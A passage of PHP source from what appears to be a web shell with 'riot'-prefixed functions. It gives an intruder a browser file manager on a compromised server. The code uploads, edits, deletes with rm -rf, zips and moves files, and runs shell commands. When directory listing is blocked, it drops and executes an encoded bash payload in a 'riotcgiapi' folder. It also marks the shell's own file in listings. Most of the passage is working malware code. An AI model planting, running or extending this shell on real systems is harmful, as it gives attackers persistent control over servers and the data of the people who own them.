        '" onChange="riotAceChangeSetting(this,\'lang\');"><option value="php">php</option><option value="python">python</option><option value="perl">perl</option><option value="c_cpp">c/c++</option><option value="csharp">c#</option><option value="ruby">ruby</option><option value="html">html</option><option value="javascript">javascript</option><option value="css">css</option><option value="xml">xml</option><option value="sql">sql</option><option value="swift">swift</option><option value="sh">bash</option><option value="lua">lua</option><option value="powershell">powershell</option><option value="jsp">jsp</option><option value="java">java</option><option value="json">json</option><option value="plain_text">plain_text</option></select><span>Soft Wrap: </span><input type="checkbox" name="wrapmode" class="ace-controler" onClick="riotAceChangeWrapMode(this,\'' .
        $base .
        '\');" checked> | <span>Font Size: </span><button class="ace-controler" style="cursor:pointer;" onclick="riotAceChangeFontSize(\'' .
        $base .
        '\',\'+\', this);return false;">+</button> | <button style="cursor:pointer;" class="ace-controler" onclick="riotAceChangeFontSize(\'' .
        $base .
        '\', \'-\', this);return false;">-</button> | ';
}

function riotFilesMan2()
{
    riothead();
    AlfaNum(8, 9, 10, 7, 6, 5, 4);
    echo '<div style="position:relative;" fm_id="1" id="filesman_holder_1" class="ajaxarea filesman-active-content"><div class="header"></div></div>';
    riotFooter();
}
function copy_paste($c, $s, $d)
{
    if (@is_dir($c . $s)) {
        @mkdir($d . $s);
        $h = @opendir($c . $s);
        while (($f = @readdir($h)) !== false) {
            if ($f != "." and $f != "..") {
                copy_paste($c . $s . "/", $f, $d . $s . "/");
            }
        }
    } elseif (is_file($c . $s)) {
        @copy($c . $s, $d . $s);
    }
}
function riotFilesMan()
{
    if (!empty($_COOKIE["riot_f"])) {
        $_COOKIE["riot_f"] = @unserialize($_COOKIE["riot_f"]);
    }
    if (!empty($_POST["riot1"])) {
        switch ($_POST["riot1"]) {
            case "uploadFile":
                $move_cmd_file = false;
                $riot_canruncmd = false;
                if ($GLOBALS["glob_chdir_false"]) {
                    $riot_canruncmd = _riot_can_runCommand(true, true);
                    $move_cmd_file = true;
                }
                if (_riot_is_writable($GLOBALS["cwd"])) {
                    $files = reArrayFiles($_FILES["f"]);
                    $ret_files = [];
                    foreach ($files as $file) {
                        if ($move_cmd_file && $riot_canruncmd) {
                            riotEx("cat '" . addslashes($file["tmp_name"]) . "' > '" . addslashes($_POST["c"] . "/" . $file["name"]) . "'");
                        } else {
                            if (@move_uploaded_file($file["tmp_name"], $file["name"])) {
                                $ow = function_exists("posix_getpwuid") && function_exists("fileowner") ? @posix_getpwuid(@fileowner($file["name"])) : ["name" => "????"];
                                $gr = function_exists("posix_getgrgid") && function_exists("filegroup") ? @posix_getgrgid(@filegroup($file["name"])) : ["name" => "????"];
                                $file_owner = $ow["name"] ? $ow["name"] : (function_exists("fileowner") ? @fileowner($file["name"]) : "????");
                                $file_group = $gr["name"] ? $gr["name"] : (function_exists("filegroup") ? @filegroup($file["name"]) : "????");
                                $file_modify = @date("Y-m-d H:i:s", @filemtime($file["name"]));
                                $file_perm = riotPermsColor($file["name"]);
                                $file_size = @filesize($file["name"]);
                                $ret_files[] = [
                                    "name" => $file["name"],
                                    "size" => riotSize($file_size),
                                    "perm" => $file_perm,
                                    "modify" => $file_modify,
                                    "owner" => $file_owner . "/" . $file_group,
                                ];
                            }
                        }
                    }
                    if (!$move_cmd_file) {
                        echo json_encode($ret_files);
                    }
                } else {
                    echo "noperm";
                    return;
                }
                if (!$move_cmd_file) {
                    return;
                }
                break;
            case "mkdir":
                $new_dir_cmd = false;
                if ($GLOBALS["glob_chdir_false"]) {
                    if (_riot_can_runCommand(true, true)) {
                        if (_riot_is_writable($GLOBALS["cwd"])) {
                            if (!_riot_is_dir(trim($_POST["riot2"]))) {
                                riotEx("cd '" . trim(addslashes($_POST["c"])) . "';mkdir '" . trim(addslashes($_POST["riot2"])) . "'");
                                echo "<script>riotShowNotification('" . addslashes($_POST["riot2"]) . " created...', 'Files manager');</script>";
                            } else {
                                echo "<script>riotShowNotification('folder already existed', 'Files manager', 'error');</script>";
                            }
                        } else {
                            echo "<script>riotShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
                        }
                    } else {
                        echo "<script>riotShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
                    }
                } else {
                    if (_riot_is_writable($GLOBALS["cwd"])) {
                        if (!_riot_is_dir(trim($_POST["riot2"]))) {
                            if (!@mkdir(trim($_POST["riot2"]))) {
                                echo "<script>riotShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
                            } else {
                                echo "<script>riotShowNotification('" . addslashes($_POST["riot2"]) . " created...', 'Files manager');</script>";
                            }
                        } else {
                            echo "<script>riotShowNotification('folder already existed', 'Files manager', 'error');</script>";
                        }
                    } else {
                        echo "<script>riotShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
                    }
                }
                break;
            case "delete":
                function deleteDir($path)
                {
                    $path = substr($path, -1) == "/" ? $path : $path . "/";
                    $dh = @opendir($path);
                    while (($item = @readdir($dh)) !== false) {
                        $item = $path . $item;
                        if (basename($item) == ".." || basename($item) == ".") {
                            continue;
                        }
                        $type = @filetype($item);
                        if ($type == "dir") {
                            deleteDir($item);
                        } else {
                            @unlink($item);
                        }
                    }
                    @closedir($dh);
                    @rmdir($path);
                }
                if (is_array(@$_POST["f"])) {
                    foreach ($_POST["f"] as $f) {
                        if ($f == "..") {
                            continue;
                        }
                        $f = rawurldecode($f);
                        if ($GLOBALS["glob_chdir_false"]) {
                            if (_riot_can_runCommand(true, true)) {
                                riotEx("rm -rf '" . addslashes($_POST["c"] . "/" . $f) . "'");
                            }
                        } else {
                            riotEx("rm -rf '" . addslashes($f) . "'", false, false);
                            if (@is_dir($f)) {
                                deleteDir($f);
                            } else {
                                @unlink($f);
                            }
                        }
                    }
                }
                if (@is_dir(rawurldecode(@$_POST["riot2"])) && rawurldecode(@$_POST["riot2"]) != "..") {
                    deleteDir(rawurldecode(@$_POST["riot2"]));
                    riotEx("rm -rf '" . addslashes($_POST["riot2"]) . "'", false, false);
                } else {
                    @unlink(rawurldecode(@$_POST["riot2"]));
                }
                if ($GLOBALS["glob_chdir_false"]) {
                    $source = rawurldecode(@$_POST["riot2"]);
                    if ($source != ".." && !empty($source)) {
                        if (_riot_can_runCommand(true, true)) {
                            riotEx("cd '" . trim(addslashes($_POST["c"])) . "';rm -rf '" . addslashes($source) . "'");
                        }
                    }
                }
                if (is_array($_POST["f"])) {
                    return;
                }
                break;
            case "paste":
                if ($_COOKIE["riot_act"] == "copy" && isset($_COOKIE["riot_f"])) {
                    foreach ($_COOKIE["riot_f"] as $f) {
                        copy_paste($_COOKIE["riot_c"], $f, $GLOBALS["cwd"]);
                    }
                } elseif ($_COOKIE["riot_act"] == "move" && isset($_COOKIE["riot_f"])) {
                    function move_paste($c, $s, $d)
                    {
                        if (@is_dir($c . $s)) {
                            @mkdir($d . $s);
                            $h = @opendir($c . $s);
                            while (($f = @readdir($h)) !== false) {
                                if ($f != "." and $f != "..") {
                                    copy_paste($c . $s . "/", $f, $d . $s . "/");
                                }
                            }
                        } elseif (@is_file($c . $s)) {
                            @copy($c . $s, $d . $s);
                        }
                    }
                    foreach ($_COOKIE["riot_f"] as $f) {
                        @rename($_COOKIE["riot_c"] . $f, $GLOBALS["cwd"] . $f);
                    }
                } elseif ($_COOKIE["riot_act"] == "zip" && isset($_COOKIE["riot_f"])) {
                    if (class_exists("ZipArchive")) {
                        $zip = new ZipArchive();
                        $zipX = "riot_" . rand(1, 1000) . ".zip";
                        if ($zip->open($zipX, 1)) {
                            @chdir($_COOKIE["riot_c"]);
                            foreach ($_COOKIE["riot_f"] as $f) {
                                if ($f == "..") {
                                    continue;
                                }
                                if (@is_file($_COOKIE["riot_c"] . $f)) {
                                    $zip->addFile($_COOKIE["riot_c"] . $f, $f);
                                } elseif (@is_dir($_COOKIE["riot_c"] . $f)) {
                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f . "/"));
                                    foreach ($iterator as $key => $value) {
                                        $key = str_replace("\\", "/", realpath($key));
                                        if (@is_dir($key)) {
                                            if (in_array(substr($key, strrpos($key, "/") + 1), [".", ".."])) {
                                                continue;
                                            }
                                        } else {
                                            $zip->addFile($key, $key);
                                        }
                                    }
                                }
                            }
                            @chdir($GLOBALS["cwd"]);
                            $zip->close();
                            __alert(">> " . $zipX . " << is created...");
                        }
                    }
                } elseif ($_COOKIE["riot_act"] == "unzip" && isset($_COOKIE["riot_f"])) {
                    if (class_exists("ZipArchive")) {
                        $zip = new ZipArchive();
                        foreach ($_COOKIE["riot_f"] as $f) {
                            if ($zip->open($_COOKIE["riot_c"] . $f)) {
                                $zip->extractTo($_COOKIE["riot_cwd"]);
                                $zip->close();
                            }
                        }
                    }
                }
                unset($_COOKIE["riot_f"]);
                break;
            default:
                if (!empty($_POST["riot1"])) {
                    if (in_array($_POST["riot1"], ["copy", "move", "zip", "unzip"])) {
                        __riot_set_cookie("riot_act", @$_POST["riot1"]);
                        __riot_set_cookie("riot_f", @serialize($_POST["f"]));
                        __riot_set_cookie("riot_c", @$_POST["c"]);
                        return;
                    }
                }
                break;
        }
    }
    $dirContent = @scandir(isset($_POST["c"]) ? $_POST["c"] : $GLOBALS["cwd"]);
    if (preg_match("#(.*)\/\.\.#", $_POST["c"], $res)) {
        $path = explode("/", $res[1]);
        array_pop($path);
        $_POST["c"] = implode("/", $path);
    }
    $cmd_dir = false;
    if ($dirContent === false) {
        if (_riot_can_runCommand(true, true)) {
            $tmp_getdir_path = @$_COOKIE["riotchdir_bash_path"];
            @chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
            if (!isset($_COOKIE["riotchdir_bash"]) || @!file_exists($tmp_getdir_path . "/riotcgiapi/getdir.riot")) {
                $bash =
                    "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
                $tmp_getdir_path = riotWriteTocgiapi("getdir.riot", $bash);
                __riot_set_cookie("riotchdir_bash", "true");
                __riot_set_cookie("riotchdir_bash_path", $tmp_getdir_path);
            }
            $dirContent = riotEx("cd " . $tmp_getdir_path . "/riotcgiapi;sh getdir.riot '" . addslashes(isset($_POST["c"]) ? $_POST["c"] : $GLOBALS["cwd"]) . "'");
            $dirContent = json_decode($dirContent, true);
            if (is_array($dirContent)) {
                array_pop($dirContent);
                $cmd_dir = true;
            } else {
                $dirContent = false;
            }
        }
    }
    riothead();
    AlfaNum(8, 9, 10, 7, 6, 5, 4);
    $count_dirContent = @count($dirContent);
    if ($count_dirContent > 300) {
        @$_COOKIE["riot_limited_files"] = 100;
    }
    $riot_sort_by = isset($_COOKIE["riot_sort_by"]) ? $_COOKIE["riot_sort_by"] : "name";
    $riot_limited_files = isset($_COOKIE["riot_limited_files"]) ? (int) $_COOKIE["riot_limited_files"] : 0;
    $riot_files_page_number = isset($_POST["pagenum"]) ? (int) $_POST["pagenum"] : 1;
    $riot_filesman_direction = isset($_COOKIE["riot_filesman_direction"]) ? $_COOKIE["riot_filesman_direction"] : "asc";
    $files_page_count = 1;
    if ($riot_limited_files > 0) {
        $files_page_count = ceil($count_dirContent / $riot_limited_files);
        if ($files_page_count > 1) {
            $files_page_count++;
        }
    }
    echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#7502FF;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'riot_sort_by\');" style="color:#7502FF;"><option value="name" ' .
        ($riot_sort_by == "name" ? "selected" : "") .
        '>Name</option><option value="size" ' .
        ($riot_sort_by == "size" ? "selected" : "") .
        '>Size</option><option value="modify" ' .
        ($riot_sort_by == "modify" ? "selected" : "") .
        '>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'riot_filesman_direction\')" style="color:#7502FF;"><option value="asc" ' .
        ($riot_filesman_direction == "asc" ? "selected" : "") .
        '>Ascending</option><option value="desc" ' .
        ($riot_filesman_direction == "desc" ? "selected" : "") .
        '>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#7502FF;" type="text" name="limited_number" value="' .
        $riot_limited_files .
        '" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'riot_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#7502FF;">' .
        ($count_dirContent - 1) .
        '</b></span></div><div class="header">';
    if ($dirContent == false) {
        echo '<center><br><span style="font-size:16px;"><span style="color: red; -webkit-text-shadow: 1px 1px 13px;"><strong><b><big>!!! Access Denied !!!</b></big><br><br></strong></div>';
        riotFooter();
        return;
    }
    global $sort;
    $sort = ["name", 1];
    if (isset($_COOKIE["riot_sort_by"]) && !empty($_COOKIE["riot_sort_by"])) {
        $sort[0] = $_COOKIE["riot_sort_by"];
    }
    if (!empty($_POST["riot1"])) {
        if (preg_match("!s_([A-z]+)_(\d{1})!", $_POST["riot1"], $match)) {
            $sort = [$match[1], (int) $match[2]];
        }
    }
    if ($riot_files_page_number > $files_page_count - 1) {
        $riot_files_page_number = 1;
    }
    $checkbox_rand = rand(11111, 99999);
    echo "<form onsubmit='fc(this);return false;' name='files' method='post'><table id='filemanager_table' width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk" .
        $checkbox_rand .
        "' onclick='checkBox(this);' class='chkbx'><label for='mchk" .
        $checkbox_rand .
        "'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
    $dirs = $files = [];
    $n = $count_dirContent;
    if ($n > $riot_limited_files && $riot_limited_files > 0) {
        $n = $riot_limited_files * $riot_files_page_number;
        if ($n > $count_dirContent) {
            $n = $count_dirContent;
        }
    }
    $i = 0;
    if ($riot_limited_files > 0 && $riot_files_page_number > 1) {
        $i = $riot_limited_files * ($riot_files_page_number - 1);
    }
    $page_builder = get_pagination_links($riot_files_page_number, $files_page_count - 1);
    $cmd_dir_backp = "";
    for (; $i < $n; $i++) {
        if ($cmd_dir) {
            $filename = $dirContent[$i]["name"];
            $file_owner = $dirContent[$i]["owner"];
            $file_group = $dirContent[$i]["group"];
            $file_modify = @date("Y-m-d H:i:s", $dirContent[$i]["modify"]);
            $file_perm = riotPermsColor(
                [
                    "class" => $dirContent[$i]["permcolor"],
                    "num" => $dirContent[$i]["permnum"],
                    "human" => $dirContent[$i]["permhuman"],
                ],
                true
            );
            $file_size = $dirContent[$i]["size"];
            if (substr($dirContent[$i]["name"], 0, 1) == "/") {
                $file_path = $dirContent[$i]["name"];
                $dirContent[$i]["name"] = "..";
                $filename = $dirContent[$i]["name"];
            } else {
                $file_path = $GLOBALS["cwd"] . "/" . $dirContent[$i]["name"];
            }
        } else {
            $filename = $dirContent[$i];
            $ow = function_exists("posix_getpwuid") && function_exists("fileowner") ? @posix_getpwuid(@fileowner($GLOBALS["cwd"] . $filename)) : ["name" => "????"];
            $gr = function_exists("posix_getgrgid") && function_exists("filegroup") ? @posix_getgrgid(@filegroup($GLOBALS["cwd"] . $filename)) : ["name" => "????"];
            $file_owner = $ow["name"] ? $ow["name"] : (function_exists("fileowner") ? @fileowner($GLOBALS["cwd"] . $filename) : "????");
            $file_group = $gr["name"] ? $gr["name"] : (function_exists("filegroup") ? @filegroup($GLOBALS["cwd"] . $filename) : "????");
            $file_modify = @date("Y-m-d H:i:s", @filemtime($GLOBALS["cwd"] . $filename));
            $file_perm = riotPermsColor($GLOBALS["cwd"] . $filename);
            $file_size = @filesize($GLOBALS["cwd"] . $filename);
            $file_path = $GLOBALS["cwd"] . $filename;
        }
        $tmp = [
            "name" => $filename,
            "path" => $file_path,
            "modify" => $file_modify,
            "perms" => $file_perm,
            "size" => $file_size,
            "owner" => $file_owner,
            "group" => $file_group,
        ];
        if ($filename == ".." && !$cmd_dir) {
            $tmp["path"] = str_replace("\\", "/", realpath($file_path));
        }
        if (!$cmd_dir) {
            if (@is_file($file_path)) {
                $arr_mrg = ["type" => "file"];
                if (@is_link($file_path)) {
                    $arr_mrg["link"] = readlink($tmp["path"]);
                }
                $files[] = array_merge($tmp, $arr_mrg);
            } elseif (@is_link($file_path)) {
                $dirs[] = array_merge($tmp, [
                    "type" => "link",
                    "link" => readlink($tmp["path"]),
                ]);
            } elseif (@is_dir($file_path) && $filename != ".") {
                $dirs[] = array_merge($tmp, ["type" => "dir"]);
            }
        } else {
            if ($dirContent[$i]["type"] == "file") {
                $files[] = array_merge($tmp, ["type" => "file"]);
            } else {
                if ($dirContent[$i]["name"] != ".") {
                    $dirs[] = array_merge($tmp, ["type" => "dir"]);
                }
            }
        }
    }
    $GLOBALS["sort"] = $sort;
    function riotCmp($a, $b)
    {
        if ($GLOBALS["sort"][0] != "size") {
            return strcmp(strtolower($a[$GLOBALS["sort"][0]]), strtolower($b[$GLOBALS["sort"][0]])) * ($GLOBALS["sort"][1] ? 1 : -1);
        } else {
            return ($a["size"] < $b["size"] ? -1 : 1) * ($GLOBALS["sort"][1] ? 1 : -1);
        }
    }
    usort($files, "riotCmp");
    usort($dirs, "riotCmp");
    if (isset($_COOKIE["riot_filesman_direction"]) && !empty($_COOKIE["riot_filesman_direction"])) {
        if ($_COOKIE["riot_filesman_direction"] == "desc") {
            $files = array_reverse($files);
            $dirs = array_reverse($dirs);
        }
    }
    $files = array_merge($dirs, $files);
    $l = 0;
    $cc = 0;
    foreach ($files as $f) {
        $f["name"] = htmlspecialchars($f["name"]);
        $newname = mb_strlen($f["name"], "UTF-8") > 60 ? mb_substr($f["name"], 0, 60, "utf-8") . "..." : $f["name"];
        $checkbox = "checkbox_" . $checkbox_rand . $cc;
        $raw_name = rawurlencode($f["name"]);
        $icon = $GLOBALS["DB_NAME"]["show_icons"] ? '<img src="' . findicon($f["name"], $f["type"]) . '" width="30" height="30">' : "";
        $style = $GLOBALS["DB_NAME"]["show_icons"] ? "position:relative;display:inline-block;bottom:12px;" : "";
        echo '<tr class="fmanager-row" id="tr_row_' .
            $cc .
            '"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="' .
            $raw_name .
            '" class="chkbx" id="' .
            $checkbox .
            '"><label for="' .
            $checkbox .
            '"></label></div></td><td id="td_row_' .
            $cc .
            '">' .
            $icon .
            '<div style="' .
            $style .
            '"><a row="' .
            $cc .
            '" id="id_' .
            $cc .
            '" class="main_name" onclick="' .
            ($f["type"] == "file"
                ? 'editor(\'' .
                    $raw_name .
                    '\',\'auto\',\'\',\'\',\'\',\'' .
                    $f["type"] .
                    '\');" href="#action=fileman&path=' .
                    $GLOBALS["cwd"] .
                    "&file=" .
                    $raw_name .
                    '" fname="' .
                    $raw_name .
                    '" ftype="file" path="' .
                    $GLOBALS["cwd"] .
                    '" opt_title="' .
                    $f["link"] .
                    '" ' .
                    (isset($f["link"]) ? 'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"' : "") .
                    ">" .
                    ($GLOBALS["cwd"] . $f["name"] == $GLOBALS["__file_path"] ? "<span class='shell_name' style='font-weight:unset;'>" . $f["name"] . "</span>" : htmlspecialchars($newname))
                : 'g(\'FilesMan\',\'' .
                    $f["path"] .
                    '\');" href="#action=fileman&path=' .
                    $f["path"] .
                    '" fname="' .
                    $raw_name .
                    '" ftype="folder" path="' .
                    $GLOBALS["cwd"] .
                    '" opt_title="' .
                    $f["link"] .
                    '" ' .
                    (isset($f["link"]) ? 'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"' : "") .
                    "><b>| " .
                    htmlspecialchars($f["name"]) .
                    " |</b>") .
            '</a></td></div><td><span style="font-weight:unset;" class="main_size">' .
            ($f["type"] == "file" ? (isset($f["link"]) ? "[L] " : "") . riotSize($f["size"]) : $f["type"]) .
            '</span></td><td><span style="font-weight:unset;" class="main_modify">' .
            $f["modify"] .
            '</span></td><td><span style="font-weight:unset;" class="main_owner_group">' .
            $f["owner"] .
            "/" .
            $f["group"] .
            '</span></td><td><a id="id_chmode_' .
            $cc .
            '" href=javascript:void(0) onclick="editor(\'' .
            $raw_name .
            '\',\'chmod\',\'\',\'\',\'\',\'' .
            $f["type"] .
            '\')">' .
            $f["perms"] .
            '</td><td><a id="id_rename_' .
            $cc .
            '" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\'' .
            $raw_name .
            '\', \'rename\',\'\',\'\',\'\',\'' .
            $f["type"] .
            '\')">R</a> <a id="id_touch_' .
            $cc .
            '" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\'' .
            $raw_name .
            '\', \'touch\',\'\',\'\',\'\',\'' .
            $f["type"] .
            '\')">T</a>' .
            ($f["type"] == "file"
                ? ' <a id="id_edit_' .
                    $cc .
                    '" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\'' .
                    $raw_name .
                    '\', \'edit\',\'\',\'\',\'\',\'' .
                    $f["type"] .
                    '\')">E</a> <a id="id_download_' .
                    $cc .
                    '" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\'' .
                    $raw_name .
                    '\', \'download\')">D</a>'
                : "") .
            '<a id="id_delete_' .
            $cc .
            '" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # ' .
            addslashes(rawurldecode($f["name"])) .
            ' # ?\'); chk ? g(\'FilesMan\',null,\'delete\', \'' .
            $raw_name .
            '\') : \'\';"> X </a></td></tr>';
        $l = $l ? 0 : 1;
        $cc++;
    }
    echo "<tr id='filemanager_last_tr'><td colspan=7>
<input type=hidden name=a value='FilesMan'>
<input type=hidden name=c value='" .
        htmlspecialchars($GLOBALS["glob_chdir_false"] ? $_POST["c"] : $GLOBALS["cwd"]) .
        "'>
<input type=hidden name=charset value='" .
        (isset($_POST["charset"]) ? $_POST["charset"] : "") .
        "'>
<select id='tools_selector' name='riot1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
<input type='submit' value=' '>
</form></table><div class='pages-holder'><div class='pages-number'>" .
        $page_builder .
        "</div></div></div></div>";
    riotfooter();
}
function get_pagination_links($current_page, $total_pages)
{
    $links = "";
    if ($total_pages >= 1 && $current_page <= $total_pages) {
        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\"><<</a>";
        $selected_page = "";
        if ($current_page == 1) {
            $selected_page = " active-page-number";
        }
        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number" . $selected_page . "\">1</a>";
        $i = max(2, $current_page - 5);
        if ($i > 2) {
            $links .= "<a class=\"page-number\">...</a>";
        }
        for (; $i < min($current_page + 6, $total_pages); $i++) {
            if ($i == $current_page) {
                $selected_page = " active-page-number";
            } else {
                $selected_page = "";
            }
            $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number" . $selected_page . "\">{$i}</a>";
        }
        if ($i != $total_pages) {
            $links .= "<a class=\"page-number\">...</a>";
        }
        $selected_page = " last-page-number";
        if ($current_page == $total_pages) {
            $selected_page .= " active-page-number";
        }
        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number" . $selected_page . "\">{$total_pages}</a>";
        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\">>></a>";
    }
    return $links;
}
function riotFilesTools()
{
    riothead();
    echo '<div class="filestools" style="height: 100%;">';
    if (isset($_POST["riot1"])) {
        $_POST["riot1"] = rawurldecode($_POST["riot1"]);
    }
    $riot1_decoded = $_POST["riot1"];
    $chdir_fals = false;
    if (!@chdir($_POST["c"])) {
        $chdir_fals = true;
        $_POST["riot1"] = $_POST["c"] . "/" . $_POST["riot1"];
        $riot_canruncmd = _riot_can_runCommand(true, true);
        if ($riot_canruncmd) {
            $slashed_riot1 = addslashes($_POST["riot1"]);
            $file_info = explode(":", riotEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "' . $slashed_riot1 . '"'));
            $perm_color_class = riotEx("if [[ -w '" . $slashed_riot1 . "' ]]; then echo main_green_perm; elif [[ -r '" . $slashed_riot1 . "' ]]; then echo main_white_perm; else echo main_red_perm; fi");
        }
    }
    if ($_POST["riot2"] == "auto") {
        if (is_array(@getimagesize($_POST["riot1"]))) {
            $_POST["riot2"] = "image";
        } else {
            $_POST["riot2"] = "view";
            if ($chdir_fals) {
                if ($riot_canruncmd) {
                    $mime = explode(":", riotEx("file --mime-type '" . addslashes($_POST["riot1"]) . "'"));
                    $mimetype = $mime[1];
                    if (!empty($mimetype)) {
                        if (strstr($mimetype, "image")) {
                            $_POST["riot2"] = "image";
                        }
                    }
                }
            }
        }
    }
    if ($_POST["riot2"] == "rename" && !empty($_POST["riot3"]) && @is_writable($_POST["riot1"])) {
        $rename_cache = $_POST["riot3"];
    }
    if (@$_POST["riot2"] == "mkfile") {
        $_POST["riot1"] = trim($_POST["riot1"]);
        if ($chdir_fals && $riot_canruncmd) {
            if (_riot_is_writable($_POST["c"])) {
                riotEx("cd '" . addslashes($_POST["c"]) . "';touch '" . addslashes($riot1_decoded) . "'");
                $_POST["riot2"] = "edit";
            }
        }
        if (!@file_exists($_POST["riot1"])) {
            $fp = @fopen($_POST["riot1"], "w");
            if ($fp) {
                $_POST["riot2"] = "edit";
                fclose($fp);
            }
        } else {
            $_POST["riot2"] = "edit";
        }
    }
    if (!_riot_file_exists(@$_POST["riot1"])) {
        echo __pre() . "<center><p><div class=\"txtfont\"><font color='red'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('" . $_POST["riot4"] . "');</script>";
        riotFooter();
        return;
    }
    if ($chdir_fals) {
        $filesize = $file_info[3];
        $uid["name"] = $file_info[1];
        $gid["name"] = $file_info[2];
        $permcolor = riotPermsColor(
            [
                "class" => $perm_color_class,
                "num" => $file_info[5],
                "human" => $file_info[6],
            ],
            true
        );
    } else {
        $uid = function_exists("posix_getpwuid") && function_exists("fileowner") ? @posix_getpwuid(@fileowner($_POST["riot1"])) : "";
        $gid = function_exists("posix_getgrgid") && function_exists("filegroup") ? @posix_getgrgid(@filegroup($_POST["riot1"])) : "";
        if (!$uid && !$gid) {
            $uid["name"] = function_exists("fileowner") ? @fileowner($_POST["riot1"]) : "";
            $gid["name"] = function_exists("filegroup") ? @filegroup($_POST["riot1"]) : "";
        }
        $permcolor = riotPermsColor($_POST["riot1"]);
        $filesize = @filesize($_POST["riot1"]);
        if (!isset($uid["name"], $gid["name"]) || empty($uid["name"]) || empty($gid["name"])) {
            if (_riot_can_runCommand()) {
                list($uid["name"], $gid["name"]) = explode(":", riotEx('stat -c "%U:%G" "' . addslashes($_POST["c"] . "/" . $_POST["riot1"]) . '"'));
            }
        }
    }
    if (substr($_POST["riot1"], 0, 7) == "phar://") {
        $riot_file_directory = $_POST["riot1"];
    } else {
        $riot_file_directory = str_replace("//", "/", ($chdir_fals ? "" : $_POST["c"] . "/") . $_POST["riot1"]);
    }
    echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> ' .
        htmlspecialchars(basename($riot1_decoded)) .
        ' <span class="editor_file_info_vars">Size:</span> ' .
        riotSize($filesize) .
        ' <span class="editor_file_info_vars">Permission:</span> ' .
        $permcolor .
        ' <span class="editor_file_info_vars">Owner/Group:</span> ' .
        $uid["name"] .
        "/" .
        $gid["name"] .
        ' <span class="editor_file_info_vars">Directory:</span> ' .
        dirname($riot_file_directory) .
        "</div>";
    if (empty($_POST["riot2"])) {
        $_POST["riot2"] = "view";
    }
    if (!_riot_is_dir($_POST["riot1"])) {
        $m = ["View", "Download", "Highlight", "Chmod", "Rename", "Touch", "Delete", "Image", "Hexdump"];
        $ftype = "file";
    } else {
        $m = ["Chmod", "Rename", "Touch"];
        $ftype = "dir";
    }
    echo "<div>";
    foreach ($m as $v) {
        echo $v == "Delete"
            ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\'' .
                addslashes(!isset($rename_cache) ? $_POST["riot1"] : $rename_cache) .
                '\',\'' .
                strtolower($v) .
                '\',\'\',\'' .
                $_POST["c"] .
                '\',\'' .
                $_POST["riot4"] .
                '\',\'' .
                $ftype .
                '\'):\'\';"><span class="editor_actions">' .
